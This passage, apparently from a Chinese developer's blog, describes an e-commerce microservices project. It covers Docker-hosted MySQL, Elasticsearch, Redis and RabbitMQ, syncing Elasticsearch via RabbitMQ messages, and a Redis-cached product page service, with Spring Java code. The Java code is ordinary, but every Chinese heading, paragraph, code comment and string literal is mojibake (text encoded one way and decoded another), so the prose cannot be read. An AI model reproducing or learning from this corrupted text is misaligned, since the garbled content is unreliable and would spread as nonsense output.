<p>è¿è¡ŒNignx 1.12ã€ç®¡ç†å‘˜é¡µé¢ï¼Œé—¨æˆ·é¡µé¢ï¼Œ10ä¸ªå¾®æœåŠ¡ï¼ˆjaråŒ…å½¢å¼ï¼‰</p>
</li>
<li><p>Macï¼šCentos 7.5 6G æœ¬åœ°è™šæ‹Ÿæœº</p>
<p>å·²dockerå®¹å™¨æ–¹å¼è¿è¡Œï¼Œmysql:5.7.25ï¼Œelasticsearch 7.2ï¼Œredisï¼Œmongoï¼Œmongo-expressï¼Œcanal&#x2F;canal-serverï¼Œrabbitmq:3-managementï¼Œkibana:7.4.2 ï¼Œ</p>
</li>
<li><p>é˜¿é‡Œäº‘æœåŠ¡å™¨ECS </p>
<p>å·²dockeræ–¹å¼è¿è¡Œï¼Œmongo4.2ï¼Œes7.10ï¼Œgraylog4</p>
</li>
<li><p>è…¾è®¯äº‘æœåŠ¡å™¨ECS </p>
<p>å·²dockeræ–¹å¼è¿è¡Œmysqlï¼š5.7.25ï¼Œredisï¼Œcanal&#x2F;canal-serverï¼Œmongoï¼Œmongo-expressï¼Œè¿è¡Œskywalking 8ï¼Œå…¶ä¸­éœ€è¦ä½¿ç”¨é˜¿é‡Œäº‘å®‰è£…çš„es7.10</p>
</li>
<li><p>é˜¿é‡Œäº‘SMSæœåŠ¡</p>
</li>
<li><p>é˜¿é‡Œäº‘OSSå­˜å‚¨æœåŠ¡</p>
</li>
</ul>
<h3 id="é¡¹ç›®ç»“æ„"><a href="#é¡¹ç›®ç»“æ„" class="headerlink" title="é¡¹ç›®ç»“æ„"></a>é¡¹ç›®ç»“æ„</h3><p>é¡¹ç›®æœ‰è®¸å¤šå¾®æœåŠ¡ç»„æˆï¼Œè€Œæ¯ä¸ªå¾®æœåŠ¡çš„ä¾èµ–åŠç‰ˆæœ¬ä¿¡æ¯éœ€è¦ç»Ÿä¸€ç®¡ç†ï¼Œå› æ­¤éœ€è¦æœ‰ä¸€ä¸ªçˆ¶å·¥ç¨‹ã€‚</p>
<p>è€Œæ¯ä¸ªå¾®æœåŠ¡æœ¬èº«æœ‰è‡ªå·±çš„ä¸šåŠ¡ï¼Œå¹¶ä¸”æœåŠ¡å’ŒæœåŠ¡é—´ä¼šæœ‰ç›¸äº’è°ƒç”¨ï¼Œéœ€è¦å°†è‡ªèº«çš„å®ä½“ç±»ã€Feignæ¥å£å¯¹å¤–æš´éœ²å‡ºå»ï¼Œæä¾›æˆjaråŒ…ä¾›åˆ«äººåŠ è½½ï¼Œé¡¹ç›®ç»“æ„å¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120505.png" alt="æˆªå±2021-07-03 ä¸‹åˆ5.10.56"></p>
<h2 id="ElasticSearchæ•°æ®åŒæ­¥é—®é¢˜è§£å†³æ–¹æ¡ˆ"><a href="#ElasticSearchæ•°æ®åŒæ­¥é—®é¢˜è§£å†³æ–¹æ¡ˆ" class="headerlink" title="ElasticSearchæ•°æ®åŒæ­¥é—®é¢˜è§£å†³æ–¹æ¡ˆ"></a>ElasticSearchæ•°æ®åŒæ­¥é—®é¢˜è§£å†³æ–¹æ¡ˆ</h2><p>æœç´¢åŠŸèƒ½ä¾èµ–çš„å•†å“æ•°æ®æ˜¯å­˜å‚¨åœ¨ElasticSearchä¸­çš„ï¼Œä½†æ˜¯æ•°æ®åº“ä¸­ä¹Ÿæœ‰ä¸€ä»½å•†å“æ•°æ®ã€‚å½“æˆ‘ä»¬å¯¹å•†å“åšå¢ã€åˆ ã€æ”¹è¿™æ ·çš„æ“ä½œæ—¶ï¼ŒElasticSearchå¹¶æœªæ„ŸçŸ¥åˆ°ï¼Œæ­¤æ—¶å°±ä¼šå‡ºç°<strong>æ•°æ®åº“æ•°æ®ä¸ç´¢å¼•åº“æ•°æ®çš„ä¸ä¸€è‡´</strong>ã€‚</p>
<p>åœ¨é¡¹ç›®è®¾è®¡æ—¶ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯å…·ä½“å®ç°è¿˜éœ€è€ƒè™‘ä¸€ä¸‹å‡ ä¸ªé—®é¢˜ï¼š</p>
<ul>
<li><p>ä»€ä¹ˆæ—¶å€™å‘æ¶ˆæ¯ï¼Ÿ</p>
<ul>
<li>å½“å•†å“æœåŠ¡å¯¹å•†å“è¿›è¡Œä¸Šä¸‹æ¶çš„æ—¶å€™ï¼Œéœ€è¦å‘é€ä¸€æ¡æ¶ˆæ¯ï¼Œé€šçŸ¥å…¶å®ƒæœåŠ¡</li>
</ul>
</li>
<li><p>å•†å“å¾®æœåŠ¡å‘é€æ¶ˆæ¯çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<ul>
<li>å¯¹å•†å“çš„å¢åˆ æ”¹æ—¶å…¶å®ƒæœåŠ¡å¯èƒ½éœ€è¦æ–°çš„å•†å“æ•°æ®ï¼Œä½†æ˜¯å¦‚æœæ¶ˆæ¯å†…å®¹ä¸­åŒ…å«å…¨éƒ¨å•†å“ä¿¡æ¯ï¼Œæ•°æ®é‡å¤ªå¤§ï¼Œè€Œä¸”å¹¶ä¸æ˜¯æ¯ä¸ªæœåŠ¡éƒ½éœ€è¦å…¨éƒ¨çš„ä¿¡æ¯ã€‚å› æ­¤æˆ‘ä»¬<strong>åªå‘é€å•†å“id</strong>ï¼Œå…¶å®ƒæœåŠ¡å¯ä»¥æ ¹æ®idæŸ¥è¯¢è‡ªå·±éœ€è¦çš„ä¿¡æ¯ã€‚</li>
</ul>
</li>
<li><p>æœç´¢å¾®æœåŠ¡æ¥æ”¶æ¶ˆæ¯åå¦‚ä½•å¤„ç†ï¼Ÿ</p>
<ul>
<li>ä¸Šæ¶ï¼šæ·»åŠ æ–°çš„æ•°æ®åˆ°ç´¢å¼•åº“</li>
<li>ä¸‹æ¶ï¼šåˆ é™¤ç´¢å¼•åº“æ•°æ®</li>
</ul>
</li>
</ul>
<p>ç¼–å†™æ¶ˆæ¯é˜Ÿåˆ—å¸¸é‡ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.common.constants;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">BaseMQConstants</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ExchangeConstants</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * å•†å“æœåŠ¡äº¤æ¢æœºåç§°</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ITEM_EXCHANGE_NAME</span> <span class="operator">=</span> <span class="string">&quot;ly.item.exchange&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * æ¶ˆæ¯æœåŠ¡äº¤æ¢æœºåç§°</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SMS_EXCHANGE_NAME</span> <span class="operator">=</span> <span class="string">&quot;ly.sms.exchange&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * è®¢å•ä¸šåŠ¡çš„äº¤æ¢æœº</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ORDER_EXCHANGE_NAME</span> <span class="operator">=</span> <span class="string">&quot;ly.order.exchange&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * æ­»ä¿¡é˜Ÿåˆ—äº¤æ¢æœºåç§°</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEAD_EXCHANGE_NAME</span> <span class="operator">=</span> <span class="string">&quot;ly.dead.exchange&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">RoutingKeyConstants</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * å•†å“ä¸Šæ¶çš„routing-key</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ITEM_UP_KEY</span> <span class="operator">=</span> <span class="string">&quot;item.up&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * å•†å“ä¸‹æ¶çš„routing-key</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ITEM_DOWN_KEY</span> <span class="operator">=</span> <span class="string">&quot;item.down&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * çŸ­ä¿¡éªŒè¯çš„routing-key</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">VERIFY_CODE_KEY</span> <span class="operator">=</span> <span class="string">&quot;sms.verify.code&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * æ¸…ç†è®¢å•routing-key</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EVICT_ORDER_KEY</span> <span class="operator">=</span> <span class="string">&quot;order.evict&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">QueueConstants</span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * æœç´¢æœåŠ¡ï¼Œå•†å“ä¸Šæ¶çš„é˜Ÿåˆ—</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SEARCH_ITEM_UP</span> <span class="operator">=</span> <span class="string">&quot;search.item.up.queue&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * æœç´¢æœåŠ¡ï¼Œå•†å“ä¸‹æ¶çš„é˜Ÿåˆ—</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SEARCH_ITEM_DOWN</span> <span class="operator">=</span> <span class="string">&quot;search.item.down.queue&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * æœç´¢æœåŠ¡ï¼Œå•†å“ä¸‹æ¶çš„é˜Ÿåˆ—</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SMS_VERIFY_CODE_QUEUE</span> <span class="operator">=</span> <span class="string">&quot;sms.verify.code.queue&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * è®¢å•æ­»ä¿¡é˜Ÿåˆ—åç§°</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEAD_ORDER_QUEUE</span> <span class="operator">=</span> <span class="string">&quot;ly.dead.order.queue&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * è®¢å•æ¸…ç†é˜Ÿåˆ—åç§°</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EVICT_ORDER_QUEUE</span> <span class="operator">=</span> <span class="string">&quot;ly.evict.order.queue&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å•†å“å¾®æœåŠ¡å‘é€æ¶ˆæ¯"><a href="#å•†å“å¾®æœåŠ¡å‘é€æ¶ˆæ¯" class="headerlink" title="å•†å“å¾®æœåŠ¡å‘é€æ¶ˆæ¯"></a>å•†å“å¾®æœåŠ¡å‘é€æ¶ˆæ¯</h3><p>Jsonæ¶ˆæ¯è½¬åŒ–å™¨ï¼š</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒAMQPä¼šä½¿ç”¨JDKçš„åºåˆ—åŒ–æ–¹å¼å¯¹å‘é€çš„æ¶ˆæ¯è¿›è¡Œå¤„ç†ï¼Œä¼ è¾“æ•°æ®æ¯”è¾ƒå¤§ï¼Œæ•ˆç‡å¤ªä½ï¼Œå¯è¯»æ€§å·®ã€‚è¿™é‡Œè‡ªå®šä¹‰æ¶ˆæ¯è½¬æ¢å™¨ï¼Œä½¿ç”¨JSONæ¥å¤„ç†ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.item.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.support.converter.Jackson2JsonMessageConverter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-06-04 01:59</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RabbitConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Jackson2JsonMessageConverter <span class="title function_">messageConverter</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Jackson2JsonMessageConverter</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>SpuServiceImpl.java:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="meta">@Transactional</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateSaleable</span><span class="params">(Long id, Boolean saleable)</span> &#123;</span><br><span class="line">      <span class="comment">// 1.æ›´æ–°SPU</span></span><br><span class="line">      <span class="type">Spu</span> <span class="variable">spu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Spu</span>();</span><br><span class="line">      spu.setId(id);</span><br><span class="line">      spu.setSaleable(saleable);</span><br><span class="line">      <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> updateById(spu);</span><br><span class="line">      <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">500</span>, <span class="string">&quot;æ›´æ–°ä¸Šä¸‹æ¶ä¿¡æ¯å¤±è´¥&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 2.æ›´æ–°SKU</span></span><br><span class="line">      flag = skuService.update().eq(<span class="string">&quot;spu_id&quot;</span>, id).set(<span class="string">&quot;saleable&quot;</span>, saleable).update();</span><br><span class="line">      <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">500</span>, <span class="string">&quot;æ›´æ–°skuä¸Šä¸‹æ¶ä¿¡æ¯å¤±è´¥&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 3.å‘é€MQæ¶ˆæ¯</span></span><br><span class="line">      <span class="type">String</span> <span class="variable">routingKey</span> <span class="operator">=</span> saleable ? BaseMQConstants.RoutingKeyConstants.ITEM_UP_KEY</span><br><span class="line">              : BaseMQConstants.RoutingKeyConstants.ITEM_DOWN_KEY;</span><br><span class="line">      rabbitTemplate.convertAndSend(BaseMQConstants.ExchangeConstants.ITEM_EXCHANGE_NAME, routingKey, id);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h3 id="æœç´¢å¾®æœåŠ¡æ¥å—æ¶ˆæ¯"><a href="#æœç´¢å¾®æœåŠ¡æ¥å—æ¶ˆæ¯" class="headerlink" title="æœç´¢å¾®æœåŠ¡æ¥å—æ¶ˆæ¯"></a>æœç´¢å¾®æœåŠ¡æ¥å—æ¶ˆæ¯</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.search.mq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.search.service.SearchService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.core.ExchangeTypes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.annotation.Exchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.annotation.Queue;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.annotation.QueueBinding;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.ExchangeConstants.ITEM_EXCHANGE_NAME;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.QueueConstants.SEARCH_ITEM_DOWN;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.QueueConstants.SEARCH_ITEM_UP;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.RoutingKeyConstants.ITEM_DOWN_KEY;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.RoutingKeyConstants.ITEM_UP_KEY;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-05-31 11:54 ä¸Šåˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ItemListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SearchService searchService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ItemListener</span><span class="params">(SearchService searchService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.searchService = searchService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RabbitListener(bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">            value = @Queue(name = SEARCH_ITEM_UP, durable = &quot;true&quot;),</span></span><br><span class="line"><span class="meta">            exchange = @Exchange(name = ITEM_EXCHANGE_NAME, type = ExchangeTypes.TOPIC),</span></span><br><span class="line"><span class="meta">            key = ITEM_UP_KEY</span></span><br><span class="line"><span class="meta">    ))</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listenItemUp</span><span class="params">(Long spuId)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(spuId != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// æ–°å¢å•†å“åˆ°ç´¢å¼•åº“</span></span><br><span class="line">            searchService.saveGoodsById(spuId);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RabbitListener(bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">            value = @Queue(name = SEARCH_ITEM_DOWN, durable = &quot;true&quot;),</span></span><br><span class="line"><span class="meta">            exchange = @Exchange(name = ITEM_EXCHANGE_NAME, type = ExchangeTypes.TOPIC),</span></span><br><span class="line"><span class="meta">            key = ITEM_DOWN_KEY</span></span><br><span class="line"><span class="meta">    ))</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">listenItemDown</span><span class="params">(Long spuId)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(spuId != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// ä»ç´¢å¼•åº“åˆ é™¤æŒ‡å®šå•†å“</span></span><br><span class="line">            searchService.deleteGoodsById(spuId);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="å•†å“é™æ€é¡µå®ç°ï¼ˆå¤„ç†é«˜å¹¶å‘è¯·æ±‚ï¼‰"><a href="#å•†å“é™æ€é¡µå®ç°ï¼ˆå¤„ç†é«˜å¹¶å‘è¯·æ±‚ï¼‰" class="headerlink" title="å•†å“é™æ€é¡µå®ç°ï¼ˆå¤„ç†é«˜å¹¶å‘è¯·æ±‚ï¼‰"></a>å•†å“é™æ€é¡µå®ç°ï¼ˆå¤„ç†é«˜å¹¶å‘è¯·æ±‚ï¼‰</h2><h3 id="ä¸»è¦ä»£ç ï¼š"><a href="#ä¸»è¦ä»£ç ï¼š" class="headerlink" title="ä¸»è¦ä»£ç ï¼š"></a>ä¸»è¦ä»£ç ï¼š</h3><p>GoodsPageServiceImpl.java:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.page.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.BeanHelper;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JsonUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.item.client.ItemClient;</span><br><span class="line"><span class="keyword">import</span> com.leyou.item.dto.*;</span><br><span class="line"><span class="keyword">import</span> com.leyou.page.dto.SpecGroupNameDTO;</span><br><span class="line"><span class="keyword">import</span> com.leyou.page.dto.SpecParamNameDTO;</span><br><span class="line"><span class="keyword">import</span> com.leyou.page.service.PageService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-06-01 2:52 ä¸‹åˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PageServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">PageService</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ItemClient itemClient;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringRedisTemplate redisTemplate;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_PREFIX_SPU</span> <span class="operator">=</span> <span class="string">&quot;page:spu:id:&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_PREFIX_SKU</span> <span class="operator">=</span> <span class="string">&quot;page:sku:id:&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_PREFIX_DETAIL</span> <span class="operator">=</span> <span class="string">&quot;page:detail:id:&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_PREFIX_CATEGORY</span> <span class="operator">=</span> <span class="string">&quot;page:category:id:&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_PREFIX_BRAND</span> <span class="operator">=</span> <span class="string">&quot;page:brand:id:&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_PREFIX_SPEC</span> <span class="operator">=</span> <span class="string">&quot;page:spec:id:&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PageServiceImpl</span><span class="params">(ItemClient itemClient, StringRedisTemplate redisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.itemClient = itemClient;</span><br><span class="line">        <span class="built_in">this</span>.redisTemplate = redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">loadSpuData</span><span class="params">(Long spuId)</span> &#123;</span><br><span class="line">        <span class="type">SpuDTO</span> <span class="variable">spu</span> <span class="operator">=</span> itemClient.querySpuById(spuId);</span><br><span class="line">        <span class="comment">// ç»„ç»‡æ•°æ®</span></span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;id&quot;</span>, spu.getId());</span><br><span class="line">        map.put(<span class="string">&quot;name&quot;</span>, spu.getName());</span><br><span class="line">        map.put(<span class="string">&quot;categoryIds&quot;</span>, spu.getCategoryIds());</span><br><span class="line">        map.put(<span class="string">&quot;brandId&quot;</span>, spu.getBrandId());</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JsonUtils.toJson(map);</span><br><span class="line">        redisTemplate.opsForValue().set(KEY_PREFIX_SPU + spuId, json);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">loadSpuDetailData</span><span class="params">(Long spuId)</span> &#123;</span><br><span class="line">        <span class="type">SpuDetailDTO</span> <span class="variable">spuDetailDTO</span> <span class="operator">=</span> itemClient.querySpuDetailById(spuId);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JsonUtils.toJson(spuDetailDTO);</span><br><span class="line">        redisTemplate.opsForValue().set(KEY_PREFIX_DETAIL + spuId, json);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">loadSkuListData</span><span class="params">(Long spuId)</span> &#123;</span><br><span class="line">        <span class="comment">// æŸ¥è¯¢ä¿¡æ¯</span></span><br><span class="line">        List&lt;SkuDTO&gt; skuList = itemClient.querySkuBySpuId(spuId);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JsonUtils.toJson(skuList);</span><br><span class="line">        <span class="comment">// å­˜å…¥redis</span></span><br><span class="line">        redisTemplate.opsForValue().set(KEY_PREFIX_SKU + spuId, json);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">loadCategoriesData</span><span class="params">(List&lt;Long&gt; ids)</span> &#123;</span><br><span class="line">        List&lt;CategoryDTO&gt; list = itemClient.queryCategoryByIds(ids);</span><br><span class="line">        List&lt;HashMap&lt;String, Object&gt;&gt; rList = list.stream().map(categoryDTO -&gt; &#123;</span><br><span class="line">            HashMap&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            map.put(<span class="string">&quot;id&quot;</span>, categoryDTO.getId());</span><br><span class="line">            map.put(<span class="string">&quot;name&quot;</span>, categoryDTO.getName());</span><br><span class="line">            <span class="keyword">return</span> map;</span><br><span class="line">        &#125;).collect(Collectors.toList());</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JsonUtils.toJson(rList);</span><br><span class="line">        redisTemplate.opsForValue().set(KEY_PREFIX_CATEGORY + ids.get(ids.size() - <span class="number">1</span>), json);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title 